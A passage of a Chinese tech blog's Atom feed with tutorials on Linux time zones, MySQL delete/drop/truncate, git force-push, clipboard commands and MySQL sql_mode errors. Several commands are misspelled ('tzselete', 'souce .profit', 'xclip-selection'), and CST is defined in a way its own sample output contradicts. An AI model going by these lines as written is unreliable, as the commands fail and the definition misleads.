&lt;p&gt;&lt;a href=&quot;https://aws.amazon.com/cn/?nc2=h_lg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Amazon Web Services &lt;/a&gt;(AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="云" scheme="https://www.0x2beace.com/tags/%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>如何修改 Linux 默认时区</title>
    <link href="https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/"/>
    <id>https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/</id>
    <published>2020-08-09T13:23:30.000Z</published>
    <updated>2020-08-22T00:44:06.247Z</updated>
    
    <content type="html"><![CDATA[<p>在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。</p><a id="more"></a><p>在Linux 服务器或系统上保持正确的时间始终是一个好习惯，它可能具有以下优点：</p><ul><li>由于Linux 中的大多数任务都是按时间控制的，因此可以保持系统任务的及时运行。</li><li>在系统上记录事件和其他信息的正确时间等等。</li></ul><p>在Linux 中设置时区，有几种方式。</p><h3 id="0x1-使用tzselete-命令"><a href="#0x1-使用tzselete-命令" class="headerlink" title="0x1. 使用tzselete 命令"></a>0x1. 使用tzselete 命令</h3><ol><li>使用<code>tzselete</code> 命令选择所在时区。</li><li>将时区所在的配置文件<code>TZ=&#39;Asia/Shanghai&#39;; export TZ</code> 添加到<code>~/.profile</code>文件。</li><li>使用<code>source ~/.profire</code>命令，使时区设置生效。</li></ol><h3 id="0x2-使用timedatectl-命令"><a href="#0x2-使用timedatectl-命令" class="headerlink" title="0x2. 使用timedatectl 命令"></a>0x2. 使用timedatectl 命令</h3><p>Ubuntu 系统提供了<code>timedatectl</code> 命令，非常方便的供我们查看设置Linux 系统时区。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot;</span><br></pre></td></tr></table></figure><p>如果你忘记了你想要的时区叫什么名字，那么可以使用下面的命令查看所有可用时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl list-timezones</span><br></pre></td></tr></table></figure><p>因为 Linux 的时间分为两种：</p><ol><li>硬件时间：由 BIOS（或CMOS）所负责。</li><li>系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。</li></ol><h3 id="0x3-设置硬件时间"><a href="#0x3-设置硬件时间" class="headerlink" title="0x3. 设置硬件时间"></a>0x3. 设置硬件时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtime</span><br><span class="line">lrwxrwxrwx  1 root root         27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC</span><br></pre></td></tr></table></figure><p>可以看到默认链接的是<code>UTC</code>，所以需要手动更改链接时区文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure><p>查看硬件时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hwclock -r</span><br></pre></td></tr></table></figure><p>将系统时间改为硬件时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hwclock --hctosys</span><br></pre></td></tr></table></figure><p>需要想清楚的是，时间戳本身是永远不变的，无论在哪个时区同一时刻所生成的时间戳一定是一样的。</p><p>会发生变化的只有时区，而时间戳则是根据时区的不同而解析出来的时间不同。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.tecmint.com/set-time-timezone-and-synchronize-time-using-timedatectl-command/" target="_blank" rel="noopener">How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command</a></li><li><a href="https://www.cnblogs.com/kerrycode/p/4217995.html" target="_blank" rel="noopener">Linux 查看设置系统时区</a></li><li><a href="https://david50.pixnet.net/blog/post/45228135-%5B%E7%AD%86%E8%A8%98%5Dlinux%E6%99%82%E9%96%93%E5%8F%8A%E6%99%82%E5%8D%80" target="_blank" rel="noopener">Linux 时间以及时区</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 删除数据及数据表</title>
    <link href="https://www.0x2beace.com/mysql-delete-data-and-data-table/"/>
    <id>https://www.0x2beace.com/mysql-delete-data-and-data-table/</id>
    <published>2020-08-06T14:36:46.000Z</published>
    <updated>2020-08-06T14:37:40.531Z</updated>
    
    <content type="html"><![CDATA[<p>在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。</p><a id="more"></a><h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p>删除表内数据，使用<code>delete</code>关键字。</p><h3 id="删除指定条件的数据"><a href="#删除指定条件的数据" class="headerlink" title="删除指定条件的数据"></a>删除指定条件的数据</h3><p>删除用户表内id 为1 的用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from User where id &#x3D; 1;</span><br></pre></td></tr></table></figure><h3 id="删除表内所有数据"><a href="#删除表内所有数据" class="headerlink" title="删除表内所有数据"></a>删除表内所有数据</h3><p>删除表中的全部数据，表结构不变。</p><p>对于 MyISAM 会立刻释放磁盘空间，InnoDB 不会释放磁盘空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from User;</span><br></pre></td></tr></table></figure><p>释放磁盘空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize table User;</span><br></pre></td></tr></table></figure><h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><p>删除数据表分为两种方式：</p><ol><li>删除数据表内数据以及表结构</li><li>只删除表内数据，保留表结构</li></ol><h4 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h4><p>使用<code>drop</code>关键词会删除整张表，啥都没有了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table User;</span><br></pre></td></tr></table></figure><h4 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h4><p><code>truncate</code> 关键字则只删除表内数据，会保留表结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table User;</span><br></pre></td></tr></table></figure><blockquote><p>思考题：如何批量删除前缀相同的表？</p></blockquote><p>想要实现 <code>drop table like &#39;wp_%&#39;</code>，没有直接可用的命令，不过可以通过Mysql 的语法来拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 删除”wp_”开头的表：</span><br><span class="line">SELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statement</span><br><span class="line">FROM information_schema.tables</span><br><span class="line">WHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;;</span><br></pre></td></tr></table></figure><p>其中<code>database_name</code>换成数据库的名称，<code>wp_</code>换成需要批量删除的表前缀。</p><blockquote><p>注意只有<code>drop</code>命令才能这样用：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists tablename&#96;;</span><br></pre></td></tr></table></figure><blockquote><p><code>truncate</code>只能这样使用：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table &#96;tp_trade&#96;.&#96;setids&#96;;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>当你不再需要该表时， 用<code>drop</code>;</p></li><li><p>当你仍要保留该表，但要删除所有记录时， 用<code>truncate</code>;</p></li><li><p>当你要删除部分记录时， 用<code>delete</code>。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="mysql" scheme="https://www.0x2beace.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Git Push -f 命令详解</title>
    <link href="https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/"/>
    <id>https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/</id>
    <published>2020-08-05T06:49:02.000Z</published>
    <updated>2020-08-05T06:49:50.351Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。<br>如果每个人直接更新的话，会导致错误代码也更新到本地了。</p><p>这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。</p><a id="more"></a><h3 id="git-push-f"><a href="#git-push-f" class="headerlink" title="git push -f"></a>git push -f</h3><p><code>git push -f</code> 这个命令的作用是将自己本地仓库的代码直接推送至仓库，完全以你的提交为准，之前其他人的提交都会被覆盖。</p><p>那么这么可怕的命令，究竟在什么情况下才适用呢？</p><h4 id="使用时机"><a href="#使用时机" class="headerlink" title="使用时机"></a>使用时机</h4><p>有两种情况下适合使用这个命令：</p><ol><li>确定需要覆覆盖提交，就像上面的那种情况，在明确部分提交会导致异常时，可以使用新的提交去覆盖。</li><li>需要整理历史提交记录时，有时候项目的 Commit Logs 可能比较乱，不能清晰的看出每一次提交的作用，可以使用 <code>rebase</code> 命令来清理历史提交记录。因为改变了历史，所以正常来说是 <code>push</code>不成功的，所以需要使用 <code>force push</code>来解决这个问题。</li></ol><h4 id="默认分支保护"><a href="#默认分支保护" class="headerlink" title="默认分支保护"></a>默认分支保护</h4><p>因为可能会出现不小心使用的情况，<code>Github</code>、<code>Gitlab</code>这类源码托管网站会提供分支保护机制。可以避免某个分支被 <code>force push</code>，默认是 <code>master</code>为保护分支。</p><p>这里以<code>Gitlab</code>为例，<code>设置-&gt;仓库-&gt;Protected Branches</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200805144123.png" alt=""></p><p>所以如果想强制提交，前提需要取消对该分支的保护。</p><blockquote><p>万一自己的代码被覆盖掉了，还救得回来吗？</p></blockquote><p>其实也是有办法的，那就是换你或是其它有之前提交的同事，再次进行 <code>git push -f</code>，将正确的内容强制提交上去，覆盖上一次<code>git push -f</code>所造成的灾难。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://gitbook.tw/chapters/github/using-force-push.html" target="_blank" rel="noopener">聽說 git push -f 這個指令很可怕，什麼情況可以使用它呢？</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。&lt;br&gt;如果每个人直接更新的话，会导致错误代码也更新到本地了。&lt;/p&gt;
&lt;p&gt;这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Windows/Mac/Linux 如何将内容输出到剪贴板</title>
    <link href="https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/"/>
    <id>https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/</id>
    <published>2020-08-05T02:07:41.000Z</published>
    <updated>2020-08-16T10:10:09.975Z</updated>
    
    <content type="html"><![CDATA[<p>如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。</p><a id="more"></a><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello mac&quot; | pbcopy</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ pbcopy &lt; remade.md</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将剪切板中的内容粘贴至文件</span><br><span class="line">$ pbpaste &gt; remade.md</span><br></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux 用户需要先安装 <code>xclip</code>，它建立了终端和剪切板之间的通道。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看剪切板中的内容</span><br><span class="line">$ xclip -o</span><br><span class="line">$ xclip -selection c -o</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello xclip&quot; | xclip-selection c</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ xclip -selection c remade.md</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将剪切板中的内容粘贴至文件</span><br><span class="line">$ xclip -selection c -o &gt; remade.md</span><br></pre></td></tr></table></figure><p>或者直接使用<code>xsel</code>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello linux&quot; | xsel</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ xsel &lt; remade.md</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello windows&quot; | clip</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ clip &lt; remade.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。&lt;/p&gt;</summary>
    
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/categories/Shell/"/>
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>如何查看 Linux 默认时区</title>
    <link href="https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/"/>
    <id>https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/</id>
    <published>2020-08-03T14:03:08.000Z</published>
    <updated>2020-08-25T02:19:08.477Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。</p><p>特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。</p><a id="more"></a><h1 id="时区的概念"><a href="#时区的概念" class="headerlink" title="时区的概念"></a>时区的概念</h1><p>关于时区，有以下几个标准：</p><ul><li>CST：北美中部标准时间</li><li>UTC：协调世界时，又称世界标准时间，简称UTC，从英文国际时间/法文协调时间”Universal Time/Temps Cordonné”而来。中国大陆、香港、澳门、台湾、蒙古国、新加坡、马来西亚、菲律宾、澳洲西部的时间与UTC的时差均为+8，也就是UTC+8。</li><li>GMT：格林尼治标准时间（旧译格林威治平均时间或格林威治标准时间；英语：Greenwich Mean Time，GMT）是指位于英国伦敦郊区的皇家格林尼治天文台的标准时间，因为本初子午线被定义在通过那里的经线。</li></ul><p>Linux 的时间分为两种：</p><ol><li>硬件时间：由 BIOS（或CMOS）所负责。</li><li>系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。</li></ol><h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><p>date命令是显示或设置系统时间与日期。</p><p>这个是最简单、最直观获取系统时间与日期的方式了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ date</span><br><span class="line">Thu Jul 30 13:23:50 CST 2020</span><br></pre></td></tr></table></figure><p>显示所在时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date +&quot;%Z %z&quot;</span><br><span class="line">CST +0800</span><br></pre></td></tr></table></figure><blockquote><p>注意 <code>+</code> 和 <code>&quot;</code>之间没有空格，否则会报表。</p></blockquote><p>date 命令常见参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%H 小时，24小时制（00~23）</span><br><span class="line">%I 小时，12小时制（01~12）</span><br><span class="line">%k 小时，24小时制（0~23）</span><br><span class="line">%l 小时，12小时制（1~12）</span><br><span class="line">%M 分钟（00~59）</span><br><span class="line">%p 显示出AM或PM</span><br><span class="line">%r 显示时间，12小时制（hh:mm:ss %p）</span><br><span class="line">%s 从1970年1月1日00:00:00到目前经历的秒数</span><br><span class="line">%S 显示秒（00~59）</span><br><span class="line">%T 显示时间，24小时制（hh:mm:ss）</span><br><span class="line">%X 显示时间的格式（%H:%M:%S）</span><br><span class="line">%Z 以字符串的形式显示时区，日期域（CST）</span><br><span class="line">%z 以数字的形式显示时区 (+0800)</span><br><span class="line">%a 星期的简称（Sun~Sat）</span><br><span class="line">%A 星期的全称（Sunday~Saturday）</span><br><span class="line">%h,%b 月的简称（Jan~Dec）</span><br><span class="line">%B 月的全称（January~December）</span><br><span class="line">%c 日期和时间（Tue Nov 20 14:12:58 2012）</span><br><span class="line">%d 一个月的第几天（01~31）</span><br><span class="line">%x,%D 日期（mm&#x2F;dd&#x2F;yy）</span><br><span class="line">%j 一年的第几天（001~366）</span><br><span class="line">%m 月份（01~12）</span><br><span class="line">%w 一个星期的第几天（0代表星期天）</span><br><span class="line">%W 一年的第几个星期（00~53，星期一为第一天）</span><br><span class="line">%y 年的最后两个数字（1999则是99）</span><br></pre></td></tr></table></figure><h2 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h2><p>timedatectl 命令非常的方便，当你不带任何参数运行它时，这条命令可以像下图一样，输出系统时间概览，其中包含当前时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl</span><br><span class="line"></span><br><span class="line">Local time: Thu 2020-07-30 05:30:21 UTC</span><br><span class="line">                  Universal time: Thu 2020-07-30 05:30:21 UTC</span><br><span class="line">                        RTC time: Thu 2020-07-30 05:30:21</span><br><span class="line">                       Time zone: Etc&#x2F;UTC (UTC, +0000)</span><br><span class="line">       System clock synchronized: yes</span><br><span class="line">systemd-timesyncd.service active: yes</span><br><span class="line">                 RTC in local TZ: no</span><br></pre></td></tr></table></figure><p>只查看时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl | grep &quot;Time zone&quot;</span><br></pre></td></tr></table></figure><h2 id="etc-timezone"><a href="#etc-timezone" class="headerlink" title="/etc/timezone"></a>/etc/timezone</h2><p>使用 cat 命令显示文件 <code>/etc/timezone</code> 的内容，来查看时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;timezone</span><br><span class="line">Etc&#x2F;UTC</span><br></pre></td></tr></table></figure><p>选择时区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tzselect</span><br></pre></td></tr></table></figure><p>选择完成之后，将时区相关的配置，写入<code>.profit</code>配置文件中。</p><p>然后使用 souce 命令，强制生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souce .profit</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linux.cn/article-7970-1.html" target="_blank" rel="noopener">在 Linux 中查看时区</a></li><li><a href="https://man.linuxde.net/date" target="_blank" rel="noopener">Linux date 命令</a></li><li><a href="https://24timezones.com/map_zh.php#/map" target="_blank" rel="noopener">世界时钟地图</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。&lt;/p&gt;
&lt;p&gt;特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Mysql only_full_group_by 异常记录</title>
    <link href="https://www.0x2beace.com/mysql-only-full-group-by-exception-record/"/>
    <id>https://www.0x2beace.com/mysql-only-full-group-by-exception-record/</id>
    <published>2020-07-31T12:17:14.000Z</published>
    <updated>2020-08-03T00:05:40.992Z</updated>
    
    <content type="html"><![CDATA[<p>最近很频繁的遇到一个Mysql 异常，错误信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column &#39;cis.q1.query_date&#39; </span><br><span class="line">which is not functionally dependent on columns in GROUP BY clause; </span><br><span class="line">this is incompatible with sql_mode&#x3D;only_full_group_by</span><br></pre></td></tr></table></figure><a id="more"></a><p>通过错误信息可以看到，是因为 <code>sql_mode</code> 引起的。</p><p>查看Mysql 当前所使用的 <code>sql_mode</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select @@sql_mode</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">|       @@sql_mode        |</span><br><span class="line">+-------------------------+</span><br><span class="line">|   ONLY_FULL_GROUP_BY    |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><h3 id="sql-mode-配置解析"><a href="#sql-mode-配置解析" class="headerlink" title="sql_mode 配置解析"></a>sql_mode 配置解析</h3><h4 id="ONLY-FULL-GROUP-BY"><a href="#ONLY-FULL-GROUP-BY" class="headerlink" title="ONLY_FULL_GROUP_BY"></a>ONLY_FULL_GROUP_BY</h4><p>对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。简而言之，就是SELECT后面接的列必须被GROUP BY后面接的列所包含。如：</p><ul><li>select a,b from table group by a,b,c; (正确)</li><li>select a,b,c from table group by a,b; (错误)</li></ul><p>这个配置会使得GROUP BY语句环境变得十分狭窄，所以一般都不加这个配置</p><h4 id="NO-AUTO-VALUE-ON-ZERO"><a href="#NO-AUTO-VALUE-ON-ZERO" class="headerlink" title="NO_AUTO_VALUE_ON_ZERO"></a>NO_AUTO_VALUE_ON_ZERO</h4><p>该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。（不信的可以试试，默认的sql_mode你在自增主键列设置为0，该字段会自动变为最新的自增值，效果和null一样），如果用户希望插入的值为0（不改变），该列又是自增长的，那么这个选项就有用了。</p><h4 id="STRICT-TRANS-TABLES"><a href="#STRICT-TRANS-TABLES" class="headerlink" title="STRICT_TRANS_TABLES"></a>STRICT_TRANS_TABLES</h4><p>在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。（InnoDB默认事务表，MyISAM默认非事务表；MySQL事务表支持将批处理当做一个完整的任务统一提交或回滚，即对包含在事务中的多条语句要么全执行，要么全部不执行。非事务表则不支持此种操作，批处理中的语句如果遇到错误，在错误前的语句执行成功，之后的则不执行；MySQL事务表有表锁与行锁非事务表则只有表锁）</p><h4 id="NO-ZERO-IN-DATE"><a href="#NO-ZERO-IN-DATE" class="headerlink" title="NO_ZERO_IN_DATE"></a>NO_ZERO_IN_DATE</h4><p>在严格模式下，不允许日期和月份为零</p><h4 id="NO-ZERO-DATE"><a href="#NO-ZERO-DATE" class="headerlink" title="NO_ZERO_DATE"></a>NO_ZERO_DATE</h4><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。</p><h4 id="ERROR-FOR-DIVISION-BY-ZERO"><a href="#ERROR-FOR-DIVISION-BY-ZERO" class="headerlink" title="ERROR_FOR_DIVISION_BY_ZERO"></a>ERROR_FOR_DIVISION_BY_ZERO</h4><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如 果未给出该模式，那么数据被零除时MySQL返回NULL</p><h4 id="NO-AUTO-CREATE-USER"><a href="#NO-AUTO-CREATE-USER" class="headerlink" title="NO_AUTO_CREATE_USER"></a>NO_AUTO_CREATE_USER</h4><p>禁止GRANT创建密码为空的用户</p><h4 id="NO-ENGINE-SUBSTITUTION"><a href="#NO-ENGINE-SUBSTITUTION" class="headerlink" title="NO_ENGINE_SUBSTITUTION"></a>NO_ENGINE_SUBSTITUTION</h4><p>如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</p><h4 id="PIPES-AS-CONCAT"><a href="#PIPES-AS-CONCAT" class="headerlink" title="PIPES_AS_CONCAT"></a>PIPES_AS_CONCAT</h4><p>将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p><h4 id="ANSI-QUOTES"><a href="#ANSI-QUOTES" class="headerlink" title="ANSI_QUOTES"></a>ANSI_QUOTES</h4><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>编辑<code>my.cnf</code>配置文件，将 <code>ONLY_FULL_GROUP_BY</code> 去掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">sql_mode &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure><p>然后重启Mysql 服务即可。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/Abysscarry/article/details/79468411" target="_blank" rel="noopener">记一次Group by 查询时的ONLY_FULL_GROUP_BY错误以及后续</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近很频繁的遇到一个Mysql 异常，错误信息如下：&lt;/p&gt;
